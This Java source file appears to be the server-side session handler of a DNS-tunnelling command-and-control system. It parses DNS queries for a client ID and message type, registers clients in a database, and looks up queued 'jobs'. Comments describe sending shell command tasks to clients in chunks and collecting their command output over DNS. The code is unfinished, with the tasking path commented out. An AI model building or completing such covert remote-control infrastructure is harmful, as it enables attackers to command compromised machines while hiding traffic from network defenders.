import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.sql.SQLException;

public class Session extends Thread {
	
	private DatagramPacket 		p;
	private DatagramSocket		s;	
	private DnsQueryPacket 		dnsQPacket; // will be created as a final step in the run method
	private DnsResponsePacket 	dnsRPacket;
	private Control				ctrl;		// slices fields of interests 
	
	// control values "client -> server"
	// used to parse type of query received
	private final int MESSAGE_TYPE_CHECKIN = (byte) 0x50;
	private final int MESSAGE_TYPE_DATA    = (byte) 0x51;	
		
	// each Session instance.. has their own DatagramPacket object to do work in their own thread
	public 
	Session(DatagramSocket s, DatagramPacket p) {		
		
		this.s = s;
		this.p = p;		
		
		// with each "DNS session.. query/response" -- do this
		dnsQPacket = new DnsQueryPacket(p.getData(), p.getLength()); 
		
		// will use various instance fields in the ctrl object to manage comms
		ctrl = new Control(dnsQPacket);
		
		start(); // start thread.. call run
	}	
	
	/* entry point of thread... do work here 
	 * 
	 * At this point, we have a DatagramPacket object containing the DNS request
	 * 
	 * From here on, we should have the following overall functionality implemented..
	 * 
	 * Parse the DNS request into DNS fields, determine how we should reply to the 
	 * DNS request based on some type of (internal query response) algorithm or
	 * signaling thing (database queries, ITC mechanisms, or IPC).
	 * 
	 * Since we are creating our own "packet" based on the interpretation of various fields
	 * ... maybe we can make our own object from the data received and parse...
	 * 
	 * portion x of packet y = clientID from client.
	 * 
	 * TO DO -> 12/10/15 -- create control object from received packet.
	 * 
	 * addClientToList(Client.id); where clientID maps to byte[1] of dns query questions.!
	 * 
	 * Issues -- how to task each "client/thread" individually.. yikes.. 
	 * each client checks a task queue
	 * 
	 * Queue of DNS response objects?
	 * 
	 * Static member of session class.
	 * 
	 * perhaps in this class... we can interpret and modify bytes of query..
	 * create a running list of clients based on client ID,
	 * some kind of task object array hash map?? .. kind like it.. prefer sql db
	 * 
	 */
	public void 
	run() {				
		
		// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		//  retrieve and add client ID to session tracker
		// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		try {
			
			ClientManager.addClient(ctrl.getClientID());
			
		} catch (SQLException e1) {
			//// auto-generated catch block
			e1.printStackTrace();
		}
		
		// ~~~~~~~~~~~~~~~~~~~~~~
   		// determine message type
   		// ~~~~~~~~~~~~~~~~~~~~~~				
		try {
			
			determineMessageType();
			
		} catch (UnsupportedEncodingException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
		// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   		// reply accordingly.. with task or with nothing.. 
   		// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		try {
			
			sendResponse();
			
		} catch (IOException e) {			
			e.printStackTrace();
		}	
	} // end run.. thread returns 
	

   	public void 
   	printDetails() {   			
		
   		if( (s == null) || (p == null) ) {	   			
			System.out.println("s is null");			
		} else {			
			System.out.println(					
			"[-] Peer IP: "   + p.getAddress() + "\n" +
			"[-] Peer Port: " + p.getPort() + "\n" +						
		    "[-] Thread ID: " + Thread.currentThread().getId() + "\n\n");
			
			System.out.println(				
			"[+] Displaying control info " + "\n" +
			///"[-] Client ID: " + ctrl.getClientID() + "\n" +
			"[-] Message Type: " + ctrl.getMessageType() + "\n" +
			///"[-] Total Data Length: " + ctrl.getTotalDataLength() + "\n" +
			"[-] Data Segment Length: " + ctrl.getDataSegmentLength() + "\n");
			
		} // end else 137  
   		
   	} // end method 
   	
   	public void 
   	sendResponse() throws IOException {		
			
   		// build datagram containing response based on data buffer.
		p = new DatagramPacket(dnsRPacket.thisBuffer, 
									dnsRPacket.getBBIndex(), 
										p.getSocketAddress());		
		
		s.send(p); 	 
   	}
   		
     	
/*
 * response contains cmd output... msg type = 0x51
 * 
 * Current Status 12/16: Will not be able to task from handleDataReception methods..
 * It would probably be easy to do, but keeping things simple for now..
 * 
 * Enhancements: 
 * a> Implement a client side task queue [done]
 * b> Continually append data received to a client buffer.. once data bytes recv == totalLen
 *    we have received all data!
 *    
 *    hard to keep state of String output while function is only called and in scope
 *    once per segment received... if multiple segment long message.
 *    how to keep appending String output and retaining previous value .. appending problem.
 *    
 *    sending output to database.. retrieve when done? 
 */
   	
   	@SuppressWarnings("unused")
	public void 
   	handleCheckin() throws UnsupportedEncodingException {   		 		
   		
   		// if tasksAvail = yes
   		try {
   								
			byte[] job = ClientManager.getJobBuffer(ctrl.getClientID());
			
			System.out.println("session -> job buffer: "); Data.printBuffer(job, job.length);
			
			if(job==null) {
				
				System.out.println("no task avail");
				
				// create the response <Default response>
				dnsRPacket = new DnsResponsePacket(dnsQPacket);	
			}
			else {
				
				// task avail				
				//dnsRPacket = new DnsResponsePacket(dnsQPacket, job);	
				dnsRPacket = new DnsResponsePacket(dnsQPacket);	
			}
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
				
   		 		
   	} // end handleCheckIn   	
   	
   	
   	// we are basically going to append the shell cmd task to qrp
   	// but if its too long.. MSS issues.. define some logic to 
   	// send the command to client in chunks... client also needs to process chunked tasking.. to do
   	// we do the chunking logic here because the user UI should not care about how long to make
   	// his task str... up to the "comms driver" to chunk..
   //	public void handleShellCmdTask(Task t) {   	
   	// have a "context" for each client session.. 
   public void 
   handleDataReception() {
   		
   		try {   			
   			
   			System.out.print( Data.byteToString(ctrl.getDataOutput()));
   			
			} catch (UnsupportedEncodingException e) {	
				
				e.printStackTrace();
			} 	   				
   	}
   	
   	public void 
   	determineMessageType() throws UnsupportedEncodingException {   		
   		
		switch (ctrl.getMessageType()) {
		
			case MESSAGE_TYPE_CHECKIN: 
				 handleCheckin();
			    // System.out.println("-- handling check in --");
				 break;
									   
			// the ctrl object will be used here alot... segment tracking.. based on totalLen..
			case MESSAGE_TYPE_DATA: 
				// handleDataReception();
				 dnsRPacket = new DnsResponsePacket(dnsQPacket);
				// System.out.println("-- handling data task output --");
				 break;		
								
			default: // query was not formatted correctly.. no client id or msg type
				dnsRPacket = new DnsResponsePacket(dnsQPacket);		
				break;
								
		} // end switch	   		   		
   	} // end method 
} // end class